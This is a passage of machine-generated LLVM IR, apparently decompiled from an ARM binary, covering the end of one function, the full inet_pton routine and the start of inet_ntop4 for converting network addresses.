dec_label_pc_1f0c4.dec_label_pc_1f0d4_crit_edge:  ; preds = %dec_label_pc_1f0c4.backedge
  %v0_1f0d4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1f0d4

dec_label_pc_1f0d4:                               ; preds = %dec_label_pc_1f0c4.dec_label_pc_1f0d4_crit_edge, %entry
  %v0_1f0d4 = phi i32 [ %v0_1f0d4.pre, %dec_label_pc_1f0c4.dec_label_pc_1f0d4_crit_edge ], [ 0, %entry ]
  %v7_1f0d4 = icmp eq i32 %v0_1f0d4, 3
  store i1 %v7_1f0d4, i1* %cpsr_z.global-to-local, align 1
  %v7_1f0d8 = icmp slt i32 %v0_1f0d4, 4
  br i1 %v7_1f0d8, label %dec_label_pc_1f0f8, label %dec_label_pc_1f0dc

dec_label_pc_1f0dc:                               ; preds = %dec_label_pc_1f0d4
  %v0_1f0dc = load i32, i32* @r4, align 4
  store i32 %v0_1f0dc, i32* @r0, align 4
  store i32 %v2_1f04c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1f0e8 = call i32 @memcpy()
  br label %dec_label_pc_1f0f8

dec_label_pc_1f0f8:                               ; preds = %dec_label_pc_1f070, %dec_label_pc_1f08c, %dec_label_pc_1f0a0, %dec_label_pc_1f0b8, %dec_label_pc_1f0d4, %dec_label_pc_1f0dc
  %storemerge = phi i32 [ 1, %dec_label_pc_1f0dc ], [ 0, %dec_label_pc_1f0d4 ], [ 0, %dec_label_pc_1f0b8 ], [ 0, %dec_label_pc_1f0a0 ], [ 0, %dec_label_pc_1f08c ], [ 0, %dec_label_pc_1f070 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1f034, i32* @r4, align 4
  store i32 %v6_1f034, i32* @r5, align 4
  store i32 %v15_1f034, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1f0d4, { 1, 0 }
  uselistorder i32 %v3_1f0c4, { 2, 1, 0 }
  uselistorder i32 %v0_1f0c4, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1f074, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_1f0f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1f0c4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1f064, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1f104 = load i32, i32* @r4, align 4
  %v6_1f104 = load i32, i32* @r5, align 4
  %v9_1f104 = load i32, i32* @r6, align 4
  %v12_1f104 = load i32, i32* @r7, align 4
  %v27_1f104 = load i32, i32* @lr, align 4
  %v7_1f110 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1f110, label %dec_label_pc_1f130, label %dec_label_pc_1f124

dec_label_pc_1f124:                               ; preds = %entry
  %v7_1f124 = icmp eq i32 %arg1, 10
  br i1 %v7_1f124, label %dec_label_pc_1f140, label %dec_label_pc_1f2f8

dec_label_pc_1f130:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  %v3_1f138 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1f310

dec_label_pc_1f140:                               ; preds = %dec_label_pc_1f124
  %v2_1f140 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1f14c = bitcast i32* %stack_var_-56 to i8*
  %v4_1f14c = call i32 @__GI_memset(i8* %v3_1f14c, i32 0, i32 16)
  %v0_1f150 = load i32, i32* @r5, align 4
  %v1_1f150 = inttoptr i32 %v0_1f150 to i8*
  %v2_1f150 = load i8, i8* %v1_1f150, align 1
  %v3_1f150 = zext i8 %v2_1f150 to i32
  store i32 %v3_1f150, i32* %r3.global-to-local, align 4
  %v7_1f154 = icmp eq i8 %v2_1f150, 58
  store i32 %v4_1f14c, i32* @r6, align 4
  %v2_1f15c = add i32 %v4_1f14c, 16
  store i32 %v2_1f15c, i32* %r8.global-to-local, align 4
  br i1 %v7_1f154, label %dec_label_pc_1f164, label %dec_label_pc_1f170

dec_label_pc_1f164:                               ; preds = %dec_label_pc_1f140
  %v1_1f164 = add i32 %v0_1f150, 1
  %v2_1f164 = inttoptr i32 %v1_1f164 to i8*
  %v3_1f164 = load i8, i8* %v2_1f164, align 1
  %v4_1f164 = zext i8 %v3_1f164 to i32
  store i32 %v4_1f164, i32* %r3.global-to-local, align 4
  store i32 %v1_1f164, i32* @r5, align 4
  %v7_1f168 = icmp eq i8 %v3_1f164, 58
  br i1 %v7_1f168, label %dec_label_pc_1f170, label %dec_label_pc_1f2f0

dec_label_pc_1f170:                               ; preds = %dec_label_pc_1f164, %dec_label_pc_1f140
  %v0_1f17c = phi i32 [ %v1_1f164, %dec_label_pc_1f164 ], [ %v0_1f150, %dec_label_pc_1f140 ]
  store i32 -34648, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1f178 = load i32, i32* @r4, align 4
  %v2_1f178 = add i32 %v0_1f178, -34648
  store i32 %v0_1f17c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1f178, i32* %stack_var_-64, align 4
  %v1_1f2543 = inttoptr i32 %v0_1f17c to i8*
  %v2_1f2544 = load i8, i8* %v1_1f2543, align 1
  %v3_1f2545 = zext i8 %v2_1f2544 to i32
  store i32 %v3_1f2545, i32* @r4, align 4
  %v2_1f2586 = icmp eq i8 %v2_1f2544, 0
  br i1 %v2_1f2586, label %dec_label_pc_1f260.thread, label %dec_label_pc_1f190

dec_label_pc_1f260.thread:                        ; preds = %dec_label_pc_1f170
  store i32 %v4_1f14c, i32* @r4, align 4
  br label %dec_label_pc_1f28c

dec_label_pc_1f190:                               ; preds = %dec_label_pc_1f170, %dec_label_pc_1f254.backedge.dec_label_pc_1f190_crit_edge
  %v0_1f194 = phi i32 [ %v3_1f254, %dec_label_pc_1f254.backedge.dec_label_pc_1f190_crit_edge ], [ %v3_1f2545, %dec_label_pc_1f170 ]
  %v2_1f190 = phi i32 [ %v2_1f190.pre, %dec_label_pc_1f254.backedge.dec_label_pc_1f190_crit_edge ], [ %v2_1f178, %dec_label_pc_1f170 ]
  store i32 %v2_1f190, i32* @r0, align 4
  %v1_1f194 = or i32 %v0_1f194, 32
  %v2_1f198 = call i32 @__GI_strchr(i32 %v2_1f190, i32 %v1_1f194)
  %v2_1f19c = icmp eq i32 %v2_1f198, 0
  %v0_1f1a0 = load i32, i32* @r5, align 4
  %v1_1f1a0 = add i32 %v0_1f1a0, 1
  store i32 %v1_1f1a0, i32* @r5, align 4
  br i1 %v2_1f19c, label %dec_label_pc_1f1c4, label %dec_label_pc_1f1a8

dec_label_pc_1f1a8:                               ; preds = %dec_label_pc_1f190
  %v2_1f1a8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1f1a8, i32* %r2.global-to-local, align 4
  %v2_1f1ac = sub i32 %v2_1f198, %v2_1f1a8
  %v1_1f1b0 = load i32, i32* @r7, align 4
  %v4_1f1b0 = mul i32 %v1_1f1b0, 16
  %v5_1f1b0 = or i32 %v4_1f1b0, %v2_1f1ac
  store i32 %v5_1f1b0, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1f1b0, 65536
  br i1 %tmp36, label %dec_label_pc_1f250, label %dec_label_pc_1f2f0

dec_label_pc_1f1c4:                               ; preds = %dec_label_pc_1f190
  %v0_1f1c4 = load i32, i32* @r4, align 4
  %v7_1f1c4 = icmp eq i32 %v0_1f1c4, 58
  br i1 %v7_1f1c4, label %dec_label_pc_1f1cc, label %dec_label_pc_1f224

dec_label_pc_1f1cc:                               ; preds = %dec_label_pc_1f1c4
  %v0_1f1cc = load i32, i32* %sb.global-to-local, align 4
  %v2_1f1cc = icmp eq i32 %v0_1f1cc, 0
  br i1 %v2_1f1cc, label %dec_label_pc_1f1d4, label %dec_label_pc_1f1e8

dec_label_pc_1f1d4:                               ; preds = %dec_label_pc_1f1cc
  %v0_1f1d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1f1d4 = icmp eq i32 %v0_1f1d4, 0
  br i1 %v2_1f1d4, label %dec_label_pc_1f1dc, label %dec_label_pc_1f2f0

dec_label_pc_1f1dc:                               ; preds = %dec_label_pc_1f1d4
  %v0_1f1dc = load i32, i32* @r6, align 4
  store i32 %v0_1f1dc, i32* %fp.global-to-local, align 4
  store i32 %v1_1f1a0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1f254.backedge

dec_label_pc_1f1e8:                               ; preds = %dec_label_pc_1f1cc
  %v1_1f1e8 = inttoptr i32 %v1_1f1a0 to i8*
  %v2_1f1e8 = load i8, i8* %v1_1f1e8, align 1
  %v3_1f1e8 = zext i8 %v2_1f1e8 to i32
  store i32 %v3_1f1e8, i32* %r3.global-to-local, align 4
  %v2_1f1ec = icmp eq i8 %v2_1f1e8, 0
  br i1 %v2_1f1ec, label %dec_label_pc_1f2f0, label %dec_label_pc_1f1f4

dec_label_pc_1f1f4:                               ; preds = %dec_label_pc_1f1e8
  %v0_1f1f4 = load i32, i32* @r6, align 4
  %v1_1f1f4 = add i32 %v0_1f1f4, 2
  store i32 %v1_1f1f4, i32* %r3.global-to-local, align 4
  %v1_1f1f8 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1f1f4, %v1_1f1f8
  br i1 %tmp37, label %dec_label_pc_1f2f0, label %dec_label_pc_1f200

dec_label_pc_1f200:                               ; preds = %dec_label_pc_1f1f4
  %v0_1f200 = load i32, i32* @r7, align 4
  %v3_1f200 = udiv i32 %v0_1f200, 256
  store i32 %v3_1f200, i32* %r2.global-to-local, align 4
  store i32 %v0_1f1f4, i32* %r3.global-to-local, align 4
  %v1_1f208 = trunc i32 %v3_1f200 to i8
  %v3_1f208 = inttoptr i32 %v0_1f1f4 to i8*
  store i8 %v1_1f208, i8* %v3_1f208, align 1
  %v4_1f208 = load i32, i32* %r3.global-to-local, align 4
  %v5_1f208 = add i32 %v4_1f208, 1
  store i32 %v5_1f208, i32* @r3, align 4
  %v0_1f20c = load i32, i32* @r7, align 4
  %v1_1f20c = trunc i32 %v0_1f20c to i8
  %v2_1f20c = load i32, i32* @r6, align 4
  %v3_1f20c = add i32 %v2_1f20c, 1
  %v4_1f20c = inttoptr i32 %v3_1f20c to i8*
  store i8 %v1_1f20c, i8* %v4_1f20c, align 1
  store i32 0, i32* @r7, align 4
  %v0_1f214 = load i32, i32* @r3, align 4
  %v1_1f214 = add i32 %v0_1f214, 1
  store i32 %v1_1f214, i32* @r6, align 4
  %v0_1f218 = load i32, i32* @r5, align 4
  store i32 %v0_1f218, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1f254.backedge

dec_label_pc_1f224:                               ; preds = %dec_label_pc_1f1c4
  %v7_1f224 = icmp eq i32 %v0_1f1c4, 46
  br i1 %v7_1f224, label %dec_label_pc_1f22c, label %dec_label_pc_1f2f0

dec_label_pc_1f22c:                               ; preds = %dec_label_pc_1f224
  %v0_1f22c = load i32, i32* @r6, align 4
  %v1_1f22c = add i32 %v0_1f22c, 4
  store i32 %v1_1f22c, i32* @r4, align 4
  %v1_1f230 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1f22c, %v1_1f230
  br i1 %tmp38, label %dec_label_pc_1f2f0, label %dec_label_pc_1f238

dec_label_pc_1f238:                               ; preds = %dec_label_pc_1f22c
  %v0_1f238 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1f238, i32* @r0, align 4
  %v3_1f240 = call i32 @inet_pton4(i32 %v0_1f238, i32 %v0_1f22c)
  %v5_1f248 = icmp sgt i32 %v3_1f240, 0
  br i1 %v5_1f248, label %dec_label_pc_1f238.dec_label_pc_1f28c_crit_edge, label %dec_label_pc_1f2f0

dec_label_pc_1f238.dec_label_pc_1f28c_crit_edge:  ; preds = %dec_label_pc_1f238
  %v0_1f2d0.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1f28c

dec_label_pc_1f250:                               ; preds = %dec_label_pc_1f1a8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1f254.backedge

dec_label_pc_1f254.backedge:                      ; preds = %dec_label_pc_1f250, %dec_label_pc_1f1dc, %dec_label_pc_1f200
  %v0_1f254 = phi i32 [ %v1_1f1a0, %dec_label_pc_1f250 ], [ %v1_1f1a0, %dec_label_pc_1f1dc ], [ %v0_1f218, %dec_label_pc_1f200 ]
  %v0_1f26012 = phi i32 [ 1, %dec_label_pc_1f250 ], [ 0, %dec_label_pc_1f1dc ], [ 0, %dec_label_pc_1f200 ]
  %v1_1f254 = inttoptr i32 %v0_1f254 to i8*
  %v2_1f254 = load i8, i8* %v1_1f254, align 1
  %v3_1f254 = zext i8 %v2_1f254 to i32
  store i32 %v3_1f254, i32* @r4, align 4
  %v2_1f258 = icmp eq i8 %v2_1f254, 0
  br i1 %v2_1f258, label %dec_label_pc_1f260, label %dec_label_pc_1f254.backedge.dec_label_pc_1f190_crit_edge

dec_label_pc_1f254.backedge.dec_label_pc_1f190_crit_edge: ; preds = %dec_label_pc_1f254.backedge
  %v2_1f190.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1f190

dec_label_pc_1f260:                               ; preds = %dec_label_pc_1f254.backedge
  %v0_1f264.pre = load i32, i32* @r6, align 4
  %v2_1f260 = icmp eq i32 %v0_1f26012, 0
  store i32 %v0_1f264.pre, i32* @r4, align 4
  br i1 %v2_1f260, label %dec_label_pc_1f28c, label %dec_label_pc_1f26c

dec_label_pc_1f26c:                               ; preds = %dec_label_pc_1f260
  %v1_1f26c = add i32 %v0_1f264.pre, 2
  store i32 %v1_1f26c, i32* %r3.global-to-local, align 4
  %v1_1f270 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1f26c, %v1_1f270
  br i1 %tmp39, label %dec_label_pc_1f2f0, label %dec_label_pc_1f278

dec_label_pc_1f278:                               ; preds = %dec_label_pc_1f26c
  store i32 %v0_1f264.pre, i32* %r3.global-to-local, align 4
  %v0_1f27c = load i32, i32* @r7, align 4
  %v3_1f27c = udiv i32 %v0_1f27c, 256
  store i32 %v3_1f27c, i32* %r2.global-to-local, align 4
  %v1_1f280 = trunc i32 %v3_1f27c to i8
  %v3_1f280 = inttoptr i32 %v0_1f264.pre to i8*
  store i8 %v1_1f280, i8* %v3_1f280, align 1
  %v4_1f280 = load i32, i32* %r3.global-to-local, align 4
  %v5_1f280 = add i32 %v4_1f280, 1
  store i32 %v5_1f280, i32* @r3, align 4
  %v0_1f284 = load i32, i32* @r7, align 4
  %v1_1f284 = trunc i32 %v0_1f284 to i8
  %v2_1f284 = load i32, i32* @r6, align 4
  %v3_1f284 = add i32 %v2_1f284, 1
  %v4_1f284 = inttoptr i32 %v3_1f284 to i8*
  store i8 %v1_1f284, i8* %v4_1f284, align 1
  %v0_1f288 = load i32, i32* @r3, align 4
  %v1_1f288 = add i32 %v0_1f288, 1
  store i32 %v1_1f288, i32* @r4, align 4
  br label %dec_label_pc_1f28c

dec_label_pc_1f28c:                               ; preds = %dec_label_pc_1f238.dec_label_pc_1f28c_crit_edge, %dec_label_pc_1f260.thread, %dec_label_pc_1f260, %dec_label_pc_1f278
  %v0_1f2d0.pre = phi i32 [ %v0_1f2d0.pre.pre, %dec_label_pc_1f238.dec_label_pc_1f28c_crit_edge ], [ %v4_1f14c, %dec_label_pc_1f260.thread ], [ %v0_1f264.pre, %dec_label_pc_1f260 ], [ %v1_1f288, %dec_label_pc_1f278 ]
  %v0_1f28c = load i32, i32* %fp.global-to-local, align 4
  %v2_1f28c = icmp eq i32 %v0_1f28c, 0
  %v1_1f2d0.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1f28c, label %dec_label_pc_1f2d0, label %dec_label_pc_1f294

dec_label_pc_1f294:                               ; preds = %dec_label_pc_1f28c
  %v9_1f294 = icmp eq i32 %v0_1f2d0.pre, %v1_1f2d0.pre
  %v2_1f298 = sub i32 %v0_1f2d0.pre, %v0_1f28c
  store i32 %v2_1f298, i32* @ip, align 4
  br i1 %v9_1f294, label %dec_label_pc_1f2f0, label %dec_label_pc_1f2b8.preheader

dec_label_pc_1f2b8.preheader:                     ; preds = %dec_label_pc_1f294
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1f2b8

dec_label_pc_1f2ac:                               ; preds = %dec_label_pc_1f2b8
  %v2_1f2c0 = sub i32 %v0_1f2cc, %v0_1f2c4
  %v0_1f2ac = load i32, i32* %fp.global-to-local, align 4
  %v2_1f2ac = add i32 %v0_1f2ac, %v2_1f2bc
  %v3_1f2ac = inttoptr i32 %v2_1f2ac to i8*
  %v4_1f2ac = load i8, i8* %v3_1f2ac, align 1
  %v6_1f2ac = zext i8 %v4_1f2ac to i32
  store i32 %v6_1f2ac, i32* @r3, align 4
  %v3_1f2b0 = inttoptr i32 %v2_1f2c0 to i8*
  store i8 %v4_1f2ac, i8* %v3_1f2b0, align 1
  %v0_1f2b4 = load i32, i32* @lr, align 4
  %v1_1f2b4 = trunc i32 %v0_1f2b4 to i8
  %v2_1f2b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_1f2b4 = load i32, i32* @r1, align 4
  %v4_1f2b4 = add i32 %v3_1f2b4, %v2_1f2b4
  %v5_1f2b4 = inttoptr i32 %v4_1f2b4 to i8*
  store i8 %v1_1f2b4, i8* %v5_1f2b4, align 1
  %v0_1f2b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f2b8.pre = load i32, i32* @ip, align 4
  %v1_1f2c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1f2b8

dec_label_pc_1f2b8:                               ; preds = %dec_label_pc_1f2b8.preheader, %dec_label_pc_1f2ac
  %v0_1f2cc = phi i32 [ %v1_1f2d0.pre, %dec_label_pc_1f2b8.preheader ], [ %v1_1f2c0.pre, %dec_label_pc_1f2ac ]
  %v1_1f2bc = phi i32 [ %v2_1f298, %dec_label_pc_1f2b8.preheader ], [ %v1_1f2b8.pre, %dec_label_pc_1f2ac ]
  %v0_1f2c4 = phi i32 [ 1, %dec_label_pc_1f2b8.preheader ], [ %v0_1f2b8.pre, %dec_label_pc_1f2ac ]
  %v2_1f2b8 = sub i32 %v0_1f2c4, %v1_1f2bc
  %v4_1f2b8 = xor i32 %v0_1f2c4, %v1_1f2bc
  %v5_1f2b8 = xor i32 %v2_1f2b8, %v0_1f2c4
  %v6_1f2b8 = and i32 %v5_1f2b8, %v4_1f2b8
  %v7_1f2b8 = icmp slt i32 %v6_1f2b8, 0
  %v8_1f2b8 = icmp slt i32 %v2_1f2b8, 0
  %v9_1f2b8 = icmp eq i32 %v0_1f2c4, %v1_1f2bc
  %v2_1f2bc = sub i32 %v1_1f2bc, %v0_1f2c4
  store i32 %v2_1f2bc, i32* @r1, align 4
  %v1_1f2c4 = add i32 %v0_1f2c4, 1
  store i32 %v1_1f2c4, i32* %r2.global-to-local, align 4
  %v3_1f2c8 = xor i1 %v8_1f2b8, %v7_1f2b8
  %v4_1f2c8 = or i1 %v9_1f2b8, %v3_1f2c8
  br i1 %v4_1f2c8, label %dec_label_pc_1f2ac, label %dec_label_pc_1f2cc

dec_label_pc_1f2cc:                               ; preds = %dec_label_pc_1f2b8
  store i32 %v0_1f2cc, i32* @r4, align 4
  br label %dec_label_pc_1f2d0

dec_label_pc_1f2d0:                               ; preds = %dec_label_pc_1f28c, %dec_label_pc_1f2cc
  %v0_1f2d0 = phi i32 [ %v0_1f2cc, %dec_label_pc_1f2cc ], [ %v0_1f2d0.pre, %dec_label_pc_1f28c ]
  %v1_1f2d0 = phi i32 [ %v0_1f2cc, %dec_label_pc_1f2cc ], [ %v1_1f2d0.pre, %dec_label_pc_1f28c ]
  %v9_1f2d0 = icmp eq i32 %v0_1f2d0, %v1_1f2d0
  br i1 %v9_1f2d0, label %dec_label_pc_1f2d8, label %dec_label_pc_1f2f0

dec_label_pc_1f2d8:                               ; preds = %dec_label_pc_1f2d0
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1f140, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1f2e4 = call i32 @memcpy()
  br label %dec_label_pc_1f310

dec_label_pc_1f2f0:                               ; preds = %dec_label_pc_1f1a8, %dec_label_pc_1f1d4, %dec_label_pc_1f1f4, %dec_label_pc_1f1e8, %dec_label_pc_1f294, %dec_label_pc_1f238, %dec_label_pc_1f224, %dec_label_pc_1f2d0, %dec_label_pc_1f164, %dec_label_pc_1f26c, %dec_label_pc_1f22c
  br label %dec_label_pc_1f310

dec_label_pc_1f2f8:                               ; preds = %dec_label_pc_1f124
  store i32 77184, i32* %r3.global-to-local, align 4
  %v0_1f2fc = call i32 @__aeabi_read_tp()
  %v3_1f300 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1f300 = sext i16 %v3_1f300 to i32
  store i32 %v4_1f300, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r2.global-to-local, align 4
  %v3_1f308 = add i32 %v4_1f300, %v0_1f2fc
  %v4_1f308 = inttoptr i32 %v3_1f308 to i32*
  store i32 97, i32* %v4_1f308, align 4
  br label %dec_label_pc_1f310

dec_label_pc_1f310:                               ; preds = %dec_label_pc_1f2f0, %dec_label_pc_1f2d8, %dec_label_pc_1f130, %dec_label_pc_1f2f8
  %v1_1f318 = phi i32 [ 0, %dec_label_pc_1f2f0 ], [ 1, %dec_label_pc_1f2d8 ], [ %v3_1f138, %dec_label_pc_1f130 ], [ -1, %dec_label_pc_1f2f8 ]
  store i32 %v3_1f104, i32* @r4, align 4
  store i32 %v6_1f104, i32* @r5, align 4
  store i32 %v9_1f104, i32* @r6, align 4
  store i32 %v12_1f104, i32* @r7, align 4
  store i32 %v27_1f104, i32* @lr, align 4
  ret i32 %v1_1f318

; uselistorder directives
  uselistorder i32 %v2_1f2bc, { 1, 0 }
  uselistorder i32 %v2_1f2b8, { 1, 0 }
  uselistorder i32 %v0_1f2c4, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1f2bc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1f2cc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1f2d0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1f2d0.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1f27c, { 1, 0 }
  uselistorder i32 %v0_1f264.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1f254, { 1, 0 }
  uselistorder i32 %v3_1f200, { 1, 0 }
  uselistorder i32 %v0_1f1f4, { 1, 0, 2 }
  uselistorder i32 %v1_1f1a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1f190, { 1, 0 }
  uselistorder i32 %v0_1f17c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1f310, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1f2f0, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1f2d0, { 1, 0 }
  uselistorder label %dec_label_pc_1f2b8, { 1, 0 }
  uselistorder label %dec_label_pc_1f28c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1f254.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1f190, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1f404 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1f3e4 = add i32 %v2_1f404, -17
  br label %dec_label_pc_1f404

dec_label_pc_1f354:                               ; preds = %dec_label_pc_1f404
  %v0_1f354 = load i32, i32* %fp.global-to-local, align 4
  %v2_1f354 = add i32 %v0_1f354, %v1_1f354
  %v3_1f354 = inttoptr i32 %v2_1f354 to i8*
  %v4_1f354 = load i8, i8* %v3_1f354, align 1
  %v6_1f354 = zext i8 %v4_1f354 to i32
  store i32 %v6_1f354, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1f354, 100
  %v2_1f35c = zext i8 %div4 to i32
  store i32 %v2_1f35c, i32* %r0.global-to-local, align 4
  %v1_1f360 = or i8 %div4, 48
  %v3_1f364 = add i32 %v2_1f414, -17
  %v4_1f364 = inttoptr i32 %v3_1f364 to i8*
  store i8 %v1_1f360, i8* %v4_1f364, align 1
  %v0_1f368 = load i32, i32* %r5.global-to-local, align 4
  %v1_1f368 = add i32 %v0_1f368, -17
  %v2_1f368 = inttoptr i32 %v1_1f368 to i8*
  %v3_1f368 = load i8, i8* %v2_1f368, align 1
  %v0_1f36c = load i32, i32* %r6.global-to-local, align 4
  %v1_1f36c = add i32 %v0_1f36c, 1
  store i32 %v1_1f36c, i32* %r6.global-to-local, align 4
  %v7_1f374 = icmp eq i8 %v3_1f368, 48
  %v0_1f37c = load i32, i32* %r4.global-to-local, align 4
  %v0_1f384 = load i32, i32* %fp.global-to-local, align 4
  %v1_1f384 = load i32, i32* %sl.global-to-local, align 4
  %v2_1f384 = add i32 %v1_1f384, %v0_1f384
  store i32 %v2_1f384, i32* %sb.global-to-local, align 4
  %v2_1f38c = udiv i32 %v0_1f37c, 10
  %v1_1f394 = urem i32 %v2_1f38c, 256
  %v2_1f398 = udiv i32 %v1_1f394, 10
  %v3_1f398 = urem i32 %v1_1f394, 10
  store i32 %v2_1f398, i32* %r0.global-to-local, align 4
  %v1_1f39c = or i32 %v3_1f398, 48
  store i32 %v1_1f39c, i32* %r1.global-to-local, align 4
  br i1 %v7_1f374, label %dec_label_pc_1f38c, label %dec_label_pc_1f3b4

dec_label_pc_1f38c:                               ; preds = %dec_label_pc_1f354
  %v7_1f3a4 = icmp eq i32 %v1_1f39c, 48
  br i1 %v7_1f3a4, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1f38c
  store i32 %v1_1f36c, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1f38c, %bb
  %v1_1f3ac = trunc i32 %v1_1f39c to i8
  store i8 %v1_1f3ac, i8* %v2_1f368, align 1
  %v0_1f3e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f3d0

dec_label_pc_1f3b4:                               ; preds = %dec_label_pc_1f354
  %v2_1f380 = add i32 %v1_1f36c, %v2_1f404
  %v1_1f3c8 = trunc i32 %v1_1f39c to i8
  %v3_1f3c8 = add i32 %v2_1f380, -17
  %v4_1f3c8 = inttoptr i32 %v3_1f3c8 to i8*
  store i8 %v1_1f3c8, i8* %v4_1f3c8, align 1
  %v0_1f3cc = load i32, i32* %r6.global-to-local, align 4
  %v1_1f3cc = add i32 %v0_1f3cc, 1
  store i32 %v1_1f3cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f3d0

dec_label_pc_1f3d0:                               ; preds = %bb18, %dec_label_pc_1f3b4
  %v0_1f3e0 = phi i32 [ %v0_1f3e0.pre, %bb18 ], [ %v1_1f3cc, %dec_label_pc_1f3b4 ]
  %v0_1f3d0 = load i32, i32* %sb.global-to-local, align 4
  %v1_1f3d0 = inttoptr i32 %v0_1f3d0 to i8*
  %v2_1f3d0 = load i8, i8* %v1_1f3d0, align 1
  %tmp19 = urem i8 %v2_1f3d0, 10
  %v3_1f3d8 = zext i8 %tmp19 to i32
  store i32 %v2_1f404, i32* %ip.global-to-local, align 4
